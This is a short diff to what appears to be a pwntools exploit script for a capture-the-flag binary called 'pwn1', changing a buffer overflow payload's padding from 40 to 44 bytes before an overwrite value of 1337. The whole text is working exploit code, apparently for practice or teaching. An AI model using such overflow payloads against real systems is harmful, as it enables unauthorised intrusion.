@@ -7,7 +7,7 @@ if args.REMOTE:
 else:
     r = process('./pwn1')
 
-PAYLOAD = b'A' * 40 + p32(1337)
+PAYLOAD = b'A' * 44 + p32(1337)
 r.recvuntil(b'?\n')
 r.sendline(PAYLOAD + b'\x00')
 
